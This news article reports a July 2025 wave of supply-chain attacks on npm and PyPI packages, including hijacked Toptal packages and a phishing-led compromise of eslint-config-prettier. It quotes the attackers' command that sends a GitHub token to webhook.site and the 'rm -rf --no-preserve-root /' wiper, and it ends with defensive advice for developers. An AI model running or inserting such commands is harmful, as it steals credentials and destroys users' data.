@@ -1,0 +1,87 @@
+---
+author: Dan Goodin
+canonical_url: https://arstechnica.com/security/2025/07/open-source-repositories-are-seeing-a-rash-of-supply-chain-attacks/
+date: '2025-07-25T15:50:37'
+excerpt: Attacks affected packages, including one with ~2.8 million weekly downloads.
+image: assets/media/VJVGxvfTgavqr2mYHJ0zkw-jKCcAN5Rqj9h23xDSmVPgw.jpeg
+source: arstechnica
+tags:
+- Biz & IT
+- Security
+- open source
+- repositories
+- supply chain attacks
+title: Supply-chain attacks on open source software are getting out of hand
+---
+<div>
+                      
+                      
+          <p>It has been a busy week for supply-chain attacks targeting open source software available in public repositories, with successful breaches of multiple developer accounts that resulted in malicious packages being pushed to unsuspecting users.</p>
+<p>The latest target, <a href="https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published">according to</a> security firm Socket, is JavaScript code available on repository npm. A total of 10 packages available from the npm page belonging to global talent agency Toptal contained malware and were downloaded by roughly 5,000 users before the supply-chain attack was detected. The packages have since been removed. This was the third supply-chain attack Socket has observed on npm in the past week.</p>
+<h2>Poisoning the well</h2>
+<p>The hackers behind the attack pulled it off by first compromising Toptal&#8217;s GitHub Organization and from there using that access to publish the malicious packages on npm.</p>
+<p>Researchers still don&#8217;t know precisely how the attack worked and what the precise relationship was between the GitHub repository changes and the publishing of the packages on npm. Socket said in an email that the npm publishing &#8220;likely happed through GitHub Actions or stored npm tokens, which were accessible once the GitHub Organization was breached.&#8221; GitHub and npm are often linked in workflows, allowing the publishing of npm packages once a GitHub organization is hijacked.</p>
+<p>&#8220;The attack could have originated from compromised GitHub access that enabled both repository modifications and npm publishing, or from separate compromise vectors that affected both platforms independently,&#8221; Socket researchers <a href="https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published">wrote Wednesday</a>. &#8220;Without additional forensic evidence, determining the precise sequence and relationship between these events remains challenging.&#8221;</p>
+<p>Toptal has yet to say how its account was compromised. Company representatives didn&#8217;t respond to an email asking.</p>
+<p>The malicious <a href="https://socket.dev/npm/package/@toptal/picasso-forms/files/73.3.2/package.json#L20">payload</a> inserted into the packages had two stages. First, the code extracted the target's GitHub authentication token and sent it to an attacker-controlled endpoint at the domain webhook.site. These tokens gave the attackers persistent access to the target&#8217;s GitHub repositories, which could in turn be used in further supply-chain attacks.</p>
+<p>The command invoking the extraction was:</p>
+<p><code>curl -d "$(gh auth token)" https://webhook[.]site/fb5b4647-aff8-418c-99e7-ec830cc2024b</code></p>
+<p>After the credentials were exfiltrated, the payload tried to delete the entire filesystem of the target&#8217;s device. The script contained commands for destroying file systems on either Unix-like or Windows operating systems. The Unix command used was:</p>
+
+          
+                       
+                  
+
+              
+          
+          
+<p><code>sudo rm -rf --no-preserve-root / </code></p>
+<p>The --no-preserve-root flag is specifically designed to override safety protections that would normally prevent deletion of the root directory.</p>
+<p>The postinstall script that includes a Windows-equivalent destructive command was:</p>
+<p><code>rm /s /q</code></p>
+<p>Socket published a <a href="https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published">separate report</a> Wednesday on yet more supply-chain attacks, one targeting npm users and another targeting users of PyPI. As of Wednesday, the four malicious packages&#8212;three published to npm and the fourth on PyPI&#8212;collectively had been downloaded more than 56,000 times. Socket said it was working to get them removed.</p>
+<p>When installed, the packages &#8220;covertly integrate surveillance functionality into the developer&#8217;s environment, enabling keylogging, screen capture, fingerprinting, webcam access, and credential theft,&#8221; Socket researchers wrote. They added that the malware monitored and captured user activity and transmitted it to attacker-controlled infrastructure. Socket used the term surveillance malware to emphasize the covert observation and data exfiltration tactics &#8220;in the context of malicious dependencies.&#8221;</p>
+<p>Last Friday, Socket <a href="https://socket.dev/blog/npm-phishing-campaign-leads-to-prettier-tooling-packages-compromise">reported</a> the third attack. This one compromised an account on npm&#160;and used the access to plant malicious code inside three packages available on the site. The compromise occurred after the attackers successfully obtained a credential token the developer used to authenticate to the site.</p>
+<p>The attackers obtained the credential through a targeted phishing attack Socket had disclosed <a href="https://socket.dev/blog/npm-phishing-email-targets-developers-with-typosquatted-domain">hours earlier</a>. The email instructed the recipient to log in through a URL on npnjs.com. The site is a typosquatting spoof of the official npmjs.com domain. To make the attack more convincing, the phishing URL contained a token field that mimicked tokens npm uses for authentication. The phishing URL was in the format of <code>https://npnjs.com/login?token=xxxxxx</code> where the xxxxxx represented the token.</p>
+ 
+
+<p><a href="https://socket.dev/blog/npm-is-package-hijacked-in-expanding-supply-chain-attack">Also compromised</a> was an npm package known as 'is.' It receives roughly 2.8 million downloads weekly.</p>
+<h2>Potential for widespread damage</h2>
+<p>Supply-chain attacks like the ones Socket has flagged have the potential to cause widespread damage. Many packages available in repositories are dependencies, meaning the dependencies must be incorporated into downstream packages for those packages to work. In many developer flows, new dependency versions are downloaded and incorporated into the downstream packages automatically.</p>
+<p>The packages flagged in the three attacks are:</p>
+<ul>
+<li><span>@toptal/picasso-tailwind</span></li>
+<li><span>@toptal/picasso-charts</span></li>
+<li><span>@toptal/picasso-shared</span></li>
+<li><span>@toptal/picasso-provider</span></li>
+<li><span>@toptal/picasso-select</span></li>
+<li><span>@toptal/picasso-quote</span></li>
+<li><span>@toptal/picasso-forms</span></li>
+<li><span>@xene/core</span></li>
+<li><span>@toptal/picasso-utils</span></li>
+<li><span>@toptal/picasso-typography</span><span>.</span></li>
+<li><span>is version 3.3.1, 5.0.0</span></li>
+<li><span>got-fetch version 5.1.11, 5.1.12</span></li>
+<li><span>Eslint-config-prettier, versions 8.10.1, 9.1.1, 10.1.6, and 10.1.7</span></li>
+<li><span>Eslint-plugin-prettier, versions 4.2.2 and 4.2.3</span></li>
+<li><span>Synckit, version 0.11.9</span></li>
+<li><span>@pkgr/core, version 0.2.8</span></li>
+<li><span>Napi-postinstall, version 0.3.1</span></li>
+</ul>
+<p>Developers who work with any of the packages targeted should ensure none of the malicious versions have been installed or incorporated into their wares. Developers working with open source packages should:</p>
+<ul>
+<li>monitor repository visibility changes in search of suspicious or unusual publishing of packages</li>
+<li>review package.json lifecycle scripts before installing dependencies</li>
+<li>use automated security scanning in continuous integration and continuous delivery pipelines</li>
+<li>regularly rotate authentication tokens</li>
+<li>use multi-factor authentication to safeguard repository accounts</li>
+</ul>
+<p>Additionally, repositories that haven&#8217;t yet made MFA mandatory should do so in the near future.</p>
+
+
+          
+                   
+            
+
+                  
+          </div>
